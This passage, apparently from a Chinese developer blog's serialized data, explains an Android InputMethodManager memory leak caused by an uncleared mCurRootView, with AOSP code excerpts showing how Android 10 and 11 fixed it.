function_\">onViewDetachedFromWindow</span><span class=\"params\">(View view)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">synchronized</span> (mH) &#123;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mServedView == view) &#123;</span><br><span class=\"line\">                mNextServedView = <span class=\"literal\">null</span>;</span><br><span class=\"line\">                ...</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们可以搜索源码发现虽然mServedView和mNextServedView都有在合适的时机做置空操作，<strong>但最关键的输入焦点View即mCurRootView没有置空的地方</strong>，这也是导致泄漏的主要原因。尤其是在列表视图（ListView，RecyclerView等）中如果itemView中带有输入框，尤其容易产生泄漏的问题。</p>\n<p>曾经的解决办法通常都是反射操作IMM实例然后把这几个View对象强制置空，此处不再赘述。</p>\n<h2 id=\"大人，时代变了\"><a href=\"#大人，时代变了\" class=\"headerlink\" title=\"大人，时代变了\"></a>大人，时代变了</h2><p>我查阅了近几年的AOSP大版本源码，意外地发现，在Android 10的IMM中，这个内存泄漏的问题竟然修复了！有点惊奇的是，这个修复还是MIUI的工程师贡献的patch。</p>\n<p>这个修复在2018年下半年就提交了，最终在Android 10才合入，下面的代码基于分支android-10.0.0_r30：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20201127125312174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\"></p>\n<p>也就是说，在Android 9及以前，IMM的内存泄漏问题都没有得到官方的及时修复，最后还是国内厂商的工程师实在忍不住给修了（之前我还在MIUI的时候也给系统组提过这个bug）。</p>\n<p>出于好奇，我查看了一下<a href=\"https://cs.android.com/android/_/android/platform/frameworks/base/+/dff365ef4dc61239fac70953b631e92972a9f41f\">这个patch的提交信息</a>：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20201127125344306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>看看描述，没差了，就是为了修复数年未解的IMM内存泄漏问题。不知道全球开发者为了这个玩意头疼了多久（毕竟Memory Leak也是一个项目质量指标的对吧，说白了影响你绩效 &#x2F;狗头）。</p>\n<p>这个问题也有对应的官方bug issue，大家有兴趣可以看看：<a href=\"https://issuetracker.google.com/issues?q=116078227\">InputMethodManager#sInstance#mCurRootView cause memory leak</a> ，最后也是得到了AOSP官方团队验证的：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20201127125406506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"进一步优化\"><a href=\"#进一步优化\" class=\"headerlink\" title=\"进一步优化\"></a>进一步优化</h2><p>虽然MIUI的大佬已经对此进行了修复，但IMM依然存在一些代码结构上的问题，可能导致了一些其他bug，官方团队在Android 11中对IMM源码做了<a href=\"https://cs.android.com/android/_/android/platform/frameworks/base/+/970d9d2e0c979cf9a0ff0a79ef49044ed1363d4f\">进一步优化</a> ，这次的改动还不小：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20201127125443171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>这里我简单做一下介绍，大家感兴趣可以查看最新的源码。我们可以发现，在最新的IMM中，后面2个View已经从中去除了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">InputMethodManager</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * This is the root view of the overall window that currently has input</span></span><br><span class=\"line\"><span class=\"comment\">     * method focus.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"meta\">@GuardedBy(&quot;mH&quot;)</span></span><br><span class=\"line\">    ViewRootImpl mCurRootView;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>只留下了mCurRootView的ViewRootImpl对象。原本IMM内很多跟mCurRootView相关的操作封装到了一个新建的<strong>ImeFocusController</strong>类中：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ImeFocusController</span> &#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> ViewRootImpl mViewRootImpl;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">boolean</span> <span class=\"variable\">mHasImeFocus</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> View mServedView;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> View mNextServedView;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@UiThread</span></span><br><span class=\"line\">    ImeFocusController(<span class=\"meta\">@NonNull</span> ViewRootImpl viewRootImpl) &#123;</span><br><span class=\"line\">        mViewRootImpl = viewRootImpl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> InputMethodManagerDelegate <span class=\"title function_\">getImmDelegate</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mViewRootImpl.mContext.getSystemService(InputMethodManager.class).getDelegate();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"meta\">@UiThread</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">onViewDetachedFromWindow</span><span class=\"params\">(View view)</span> &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mServedView == view) &#123;</span><br><span class=\"line\">            mNextServedView = <span class=\"literal\">null</span>;</span><br><span class=\"line\">            mViewRootImpl.dispatchCheckFocus();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@UiThread</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">onWindowDismissed</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mServedView != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            getImmDelegate().finishInput();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        getImmDelegate().setCurrentRootView(<span class=\"literal\">null</span>);</span><br><span class=\"line\">        mHasImeFocus = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">public</span> View <span class=\"title function_\">getServedView</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mServedView;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> View <span class=\"title function_\">getNextServedView</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mNextServedView;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setServedView</span><span class=\"params\">(View view)</span> &#123;</span><br><span class=\"line\">        mServedView = view;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setNextServedView</span><span class=\"params\">(View view)</span> &#123;</span><br><span class=\"line\">        mNextServedView = view;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们可以看到，曾经的置空操作基本都放到了这个Controller中。mServedView和mNextServedView不再是IMM的成员，而是ImeFocusController的成员，且ImeFocusController又是ViewRootImpl的成员（此Controller实例化在ViewRootImpl的构造方法中）。</p>\n<p>这个patch的优化，一定程度上解除了View对IMM的依赖，代码有效解耦。输入焦点处理的相关逻辑都转移到了View本身来控制，进一步避免了内存泄漏。</p>\n<h2 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h2><p>其实每次我在搜到一些问题的解决资料时，都会关注一下帖子的发布时间，我发现IMM内存泄漏这个问题基本都是2019年之前的，好奇就去看了下最新的源码发现果然有所修复。Android系统还是在朝着越来越稳定，性能越来越优秀的方向发展。</p>\n<p>在AOSP的Code Review平台上也可以发现，其实国内外各大手机厂商都对AOSP有着巨大的贡献，大家也不是一味埋头搞自己的定制，有bug还是会反哺修复的。再次感谢开源！</p>\n<p>感兴趣可以浏览，会看到很多change的owner都不是Google的：</p>\n<ul>\n<li><a href=\"https://android-review.googlesource.com/q/xiaomi\">https://android-review.googlesource.com/q/xiaomi</a></li>\n<li><a href=\"https://android-review.googlesource.com/q/huawei\">https://android-review.googlesource.com/q/huawei</a></li>\n<li><a href=\"https://android-review.googlesource.com/q/oppo\">https://android-review.googlesource.com/q/oppo</a></li>\n<li><a href=\"https://android-review.googlesource.com/q/samsung\">https://android-review.googlesource.com/q/samsung</a></li>\n<li><a href=\"https://android-review.googlesource.com/q/sony\">https://android-review.googlesource.com/q/sony</a></li>\n</ul>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"历史问题\"><a href=\"#历史问题\" class=\"headerlink\" title=\"历史问题\"></a>历史问题</h2><p>相信做过很多业务开发的同学都遇到过Android应用的内存泄漏问题，虽然大部分泄漏都是我们自己<strong>菜</strong>导致的，但实际上系统服务也有可能出现内存泄漏。毕竟，代码都是人写的，AOSP也不是完美无瑕的。</p>\n<p>说到系统服务，在处理文本输入的时候，我们以前经常会看到这样的泄漏：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20201127125205854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>这里大家也可自行搜索了解，大致上就是因为<strong>InputMethodManager（下简称IMM）实例内部会持有View</strong>，而View又持有Activity的引用，最终在Activity退出后没有正确处理View导致了Memory Leak。我们明白，系统服务生命周期一般是长于Activity的。</p>\n<p>这里可以查看旧版AOSP源码（分支：android-9.0.0-r8）来取证：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">InputMethodManager</span> &#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * This is the root view of the overall window that currently has input</span></span><br><span class=\"line\"><span class=\"comment\">     * method focus.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    View mCurRootView;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * This is the view that should currently be served by an input method,</span></span><br><span class=\"line\"><span class=\"comment\">     * regardless of the state of setting that up.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    View mServedView;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * This is then next view that will be served by the input method, when</span></span><br><span class=\"line\"><span class=\"comment\">     * we get around to updating things.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    View mNextServedView;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * When the focused window is dismissed, this method is called to finish the</span></span><br><span class=\"line\"><span class=\"comment\">     * input method started before.</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@hide</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">windowDismissed</span><span class=\"params\">(IBinder appWindowToken)</span> &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        <span class=\"keyword\">synchronized</span> (mH) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mServedView != <span class=\"literal\">null</span> &amp;&amp;</span><br><span class=\"line\">                    mServedView.getWindowToken() == appWindowToken) &#123;</span><br><span class=\"line\">                finishInputLocked();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Disconnect any existing input connection, clearing the served view.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">finishInputLocked</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        mNextServedView = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mServedView != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">            mServedView = <span class=\"literal\">null</span>;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Call this when a view is being detached from a &#123;<span class=\"doctag\">@link</span> android.view.Window&#125;.</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@hide</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onViewDetachedFromWindow</span><span class=\"params\">(View view)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">synchronized</span> (mH) &#123;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mServedView == view) &#123;</span><br><span class=\"line\">                mNextServedView = <span class=\"literal\">null</span>;</span><br><span class=\"line\">                ...</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们可以搜索源码发现虽然mServedView和mNextServedView都有在合适的时机做置空操作，<strong>但最关键的输入焦点View即mCurRootView没有置空的地方</strong>，这也是导致泄漏的主要原因。尤其是在列表视图（ListView，RecyclerView等）中如果itemView中带有输入框，尤其容易产生泄漏的问题。</p>\n<p>曾经的解决办法通常都是反射操作IMM实例然后把这几个View对象强制置空，此处不再赘述。</p>\n<h2 id=\"大人，时代变了\"><a href=\"#大人，时代变了\" class=\"headerlink\" title=\"大人，时代变了\"></a>大人，时代变了</h2><p>我查阅了近几年的AOSP大版本源码，意外地发现，在Android 10的IMM中，这个内存泄漏的问题竟然修复了！有点惊奇的是，这个修复还是MIUI的工程师贡献的patch。</p>\n<p>这个修复在2018年下半年就提交了，最终在Android 10才合入，下面的代码基于分支android-10.0.0_r30：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20201127125312174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\"></p>\n<p>也就是说，在Android 9及以前，IMM的内存泄漏问题都没有得到官方的及时修复，最后还是国内厂商的工程师实在忍不住给修了（之前我还在MIUI的时候也给系统组提过这个bug）。</p>\n<p>出于好奇，我查看了一下<a href=\"https://cs.android.com/android/_/android/platform/frameworks/base/+/dff365ef4dc61239fac70953b631e92972a9f41f\">这个patch的提交信息</a>：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20201127125344306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>看看描述，没差了，就是为了修复数年未解的IMM内存泄漏问题。不知道全球开发者为了这个玩意头疼了多久（毕竟Memory Leak也是一个项目质量指标的对吧，说白了影响你绩效 &#x2F;狗头）。</p>\n<p>这个问题也有对应的官方bug issue，大家有兴趣可以看看：<a href=\"https://issuetracker.google.com/issues?q=116078227\">InputMethodManager#sInstance#mCurRootView cause memory leak</a> ，最后也是得到了AOSP官方团队验证的：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20201127125406506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"进一步优化\"><a href=\"#进一步优化\" class=\"headerlink\" title=\"进一步优化\"></a>进一步优化</h2><p>虽然MIUI的大佬已经对此进行了修复，但IMM依然存在一些代码结构上的问题，可能导致了一些其他bug，官方团队在Android 11中对IMM源码做了<a href=\"https://cs.android.com/android/_/android/platform/frameworks/base/+/970d9d2e0c979cf9a0ff0a79ef49044ed1363d4f\">进一步优化</a> ，这次的改动还不小：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20201127125443171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>这里我简单做一下介绍，大家感兴趣可以查看最新的源码。我们可以发现，在最新的IMM中，后面2个View已经从中去除了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">InputMethodManager</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * This is the root view of the overall window that currently has input</span></span><br><span class=\"line\"><span class=\"comment\">     * method focus.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"meta\">@GuardedBy(&quot;mH&quot;)</span></span><br><span class=\"line\">    ViewRootImpl mCurRootView;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>只留下了mCurRootView的ViewRootImpl对象。原本IMM内很多跟mCurRootView相关的操作封装到了一个新建的<strong>ImeFocusController</strong>类中：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ImeFocusController</span> &#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> ViewRootImpl mViewRootImpl;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">boolean</span> <span class=\"variable\">mHasImeFocus</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> View mServedView;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> View mNextServedView;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@UiThread</span></span><br><span class=\"line\">    ImeFocusController(<span class=\"meta\">@NonNull</span> ViewRootImpl viewRootImpl) &#123;</span><br><span class=\"line\">        mViewRootImpl = viewRootImpl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> InputMethodManagerDelegate <span class=\"title function_\">getImmDelegate</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mViewRootImpl.mContext.getSystemService(InputMethodManager.class).getDelegate();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"meta\">@UiThread</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">onViewDetachedFromWindow</span><span class=\"params\">(View view)</span> &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mServedView == view) &#123;</span><br><span class=\"line\">            mNextServedView = <span class=\"literal\">null</span>;</span><br><span class=\"line\">            mViewRootImpl.dispatchCheckFocus();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@UiThread</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">onWindowDismissed</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mServedView != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            getImmDelegate().finishInput();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        getImmDelegate().setCurrentRootView(<span class=\"literal\">null</span>);</span><br><span class=\"line\">        mHasImeFocus = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">public</span> View <span class=\"title function_\">getServedView</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mServedView;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> View <span class=\"title function_\">getNextServedView</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mNextServedView;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setServedView</span><span class=\"params\">(View view)</span> &#123;</span><br><span class=\"line\">        mServedView = view;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setNextServedView</span><span class=\"params\">(View view)</span> &#123;</span><br><span class=\"line\">        mNextServedView = view;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们可以看到，曾经的置空操作基本都放到了这个Controller中。mServedView和mNextServedView不再是IMM的成员，而是ImeFocusController的成员，且ImeFocusController又是ViewRootImpl的成员（此Controller实例化在ViewRootImpl的构造方法中）。</p>\n<p>这个patch的优化，一定程度上解除了View对IMM的依赖，代码有效解耦。输入焦点处理的相关逻辑都转移到了View本身来控制，进一步避免了内存泄漏。</p>\n<h2 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" 